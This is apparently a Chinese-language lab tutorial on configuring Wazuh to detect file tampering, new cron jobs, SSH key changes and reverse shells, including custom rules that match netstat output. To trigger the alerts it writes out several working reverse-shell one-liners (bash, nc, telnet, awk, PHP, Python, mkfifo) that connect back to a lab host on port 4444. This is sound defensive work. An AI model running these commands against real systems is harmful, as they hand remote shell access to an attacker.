[TOC]



# ==Wazuh检测系统异常==

#### 一、检测敏感文件

##### 1、全局设置

```xml
<syscheck>    
    <disabled>no</disabled>    
    <frequency>10</frequency> 
    
    <scan_on_start>yes</scan_on_start> 
    
    <alert_new_files>yes</alert_new_files>    
    <auto_ignore frequency="10" timeframe="3600">no</auto_ignore>
    
    <directories>/etc,/usr/bin,/usr/sbin</directories>    
    <directories>/bin,/sbin,/boot</directories>    
    <directories>/opt/lampp/htdocs,/tmp</directories>    
    ……………………………………………………略
</syscheck>
```

![image-20250211152322492](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211152322492.png)

意思就是，开启 File integrity monitoring 的功能并且监控的文件范围使用 <directories> 标签包裹起来。

##### 2、敏感文件检测

（1）尝试修改 /etc/passwd 文件

比如我在这里删掉了一个用户 userdel ymqyyds

![image-20250211153613739](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211153613739.png)

然后 `tail -f /var/ossec/logs/alerts/alerts.log` 

![image-20250211153913175](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211153913175.png)

![image-20250211153942702](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211153942702.png)

![image-20250211153957643](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250211153957643.png)

![image-20250211154041716](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154041716.png)

![image-20250211154056976](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154056976.png)

![image-20250211154124773](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154124773.png)

![image-20250211154139016](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154139016.png)

![image-20250211154154344](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154154344.png)

![image-20250211154206657](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154206657.png)

![image-20250211154219469](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154219469.png)

![image-20250211154230504](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154230504.png)

![image-20250211154244193](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154244193.png)

我们可以发现，不管是新加用户还是删除用户，都会引起一连串的文件的修改

我们还可以看到，上述预警的 rule id 都是 550，那么我们就来看一看，这个 550 到底是什么

![image-20250211154816192](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154816192.png)

他的规则库文件就是 ossec rules.xml 文件

![image-20250211154901658](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154901658.png)

可以看到他的解码器是 syscheck_integrity_changed 。来查找一下

![image-20250211154942408](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211154942408.png)

ok，什么都没有，这些东西都是系统内置的

（2）尝试往 /etc 目录中写入一个新的文件

![image-20250211155151509](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211155151509.png)

![image-20250211155216924](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211155216924.png)

如果我们删除文件呢？

![image-20250211155441681](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211155441681.png)

![image-20250211155433730](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211155433730.png)

（3）尝试修改 /etc/sudoers 文件

（4）尝试往 /opt/lampp/htdocs/ 目录中写入一个木马

![image-20250211155739088](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211155739088.png)

![image-20250211155808060](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211155808060.png)

（5）尝试用一个用户登录系统

![image-20250211160614684](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211160614684.png)

（6）尝试修改某个文件的权限

![image-20250211160717778](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211160717778.png)

![image-20250211160733336](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211160733336.png)

（7）为某个可执行文件赋予 u+s 的权限

（8）尝试安装一个新的应用程序，如hping3



#### 二、 检测反弹Shell

学会使用 netstat 指令

![image-20250211161027154](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211161027154.png)

![image-20250211161410878](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211161410878.png)

![image-20250211161436317](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211161436317.png)

可以发现 alerts.log 日志文件根本没有日志输出，因此：

由于反弹shell并不会进行日志输出，所以我们在这里就需要进行 wazuh 的命令输出 配置

##### 1、使用命令确认

先在Windows上使用nc开启端口监听反弹 nc -lvp 4444，再在Linux执行以下命令实现反弹

```shell
bash -i >& /dev/tcp/192.168.230.1/4444 0>&1
或
sh -i >& /dev/tcp/192.168.230.1/4444 0>&1
```

![image-20250211161711396](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211161711396.png)

![image-20250211161822076](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211161822076.png)

再使用以下命令查看网络或进程情况，并大致掌握其特点

```shell
netstat -anptl | grep /bash    /sh   等进行检测

ss -apn | grep ESTAB | egrep '("bash"|"sh")'

ps -ef | grep bash

ps -eo user,pid,cmd | grep bash
```

![image-20250211161859996](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211161859996.png)

![image-20250211162031685](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211162031685.png)

![image-20250211162123257](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211162123257.png)

![image-20250211162225446](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211162225446.png)

![image-20250211164317357](C:\Users\hp\AppData\Roaming\Typora\typora-user-images\image-20250211164317357.png)

##### 2、配置检测命令

```xml
<localfile>    
    <log_format>command</log_format>    
    <command>netstat -anptul</command>    
    <frequency>10</frequency>
</localfile>
```

![image-20250211163319664](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211163319664.png)

这个配置的作用就是监控对应的命令所产生的结果中的内容（并且由 wazuh 自动执行该命令，事件间隔使用 <frequency> 字段来确定，比如这里实验环境采取10秒钟），然后我们在下面在使用 rules 规则库来对执行结果进行匹配

##### 3、 为命令输出设定规则

![image-20250211163030657](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211163030657.png)

首先自己写规则之前，看看默认的规则是怎么写的，基本都是引用的 530 作为匹配前提，那我们也按照这样写

```xml
<group name="ossec,">  
    <rule id="561201" level="0">    
        <if_sid>530</if_sid>    
        <match>ossec: output: 'netstat -anptul'</match>    
        <description>正在监听反弹Shell</description>    
        <group>process_monitor,</group>  
    </rule>  
    
    <rule id="561202" level="15">    
        <if_sid>561201</if_sid>    
        <match>bash</match>    
        <description>监听到反弹Shell</description>    
        <group>process_monitor,attack</group>  
    </rule>
</group>
```

##### 4、尝试其他反弹指令

```shell
nc -e /bin/bash 192.168.230.148 4444

telnet 192.168.230.1 4444 | /bin/bash | telnet 192.168.230.1 5555

awk 'BEGIN{s="/inet/tcp/0/192.168.230.1/4444";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}'

<?php
	system("bash -c 'bash -i >& /dev/tcp/192.168.230.1/4444 0>&1'");
?>

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.230.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image-20250211164045291](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211164045291.png)

![image-20250211164054416](https://gitee.com/ymq_typroa/typroa/raw/main/image-20250211164054416.png)

##### 5、进一步进行优化

如果系统并没有使用bash或sh，而是使用awk或者其他程序，或者是攻击者复制了bash并将其重命名为一个新的文件呢？此时需要寻找更为通用的方法。

```shell
# 从netstat的结果中去除本地连接IP和特定服务端口，其他则疑似反弹Shell
netstat -antp | grep -E -v ":22|:25|:80|:443|:81|:3306|:1514|:1515" | grep -v 127.0.0.1 |grep ESTABLISHED

# 通过lsof列出当前系统打开的文件情况，来决定是否存在远程文件，再排除掉系统本身已知的连接文件
lsof | grep -E "TCP.*[0-9]+.[0-9]+.[0-9]+.[0-9]+" | grep -E -v "wazuh.*|sshd"
```

再利用ls命令查看进程描述符：

可以看到0、1、2三个设备均被重定向到远程Socket连接上。

试一试，使用以下命令进行反弹：`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.230.1 4444 >/tmp/f`

#### 三、 检测其他指令

##### 1、定时任务

```xml
<syscheck>   
    <frequency>30</frequency>   
    <directories>/etc/crontab,/var/spool/cron/,/etc/cron.d/</directories>
</syscheck>
<syscheck>   
    <frequency>300</frequency>   
    <directories>/etc/cron.hourly/</directories>
</syscheck>
<syscheck>   
    <frequency>1200</frequency>   
    <directories>/etc/cron.daily/,/etc/cron.weekly/,/etc/cron.hourly/</directories>
</syscheck>
```

##### 2、公钥文件

```xml
<syscheck>    
    <frequency>120</frequency>    
    <directories>/root/.ssh/authorized_keys,/home</directories>
</syscheck>
```

> 其他更多用法，如法炮制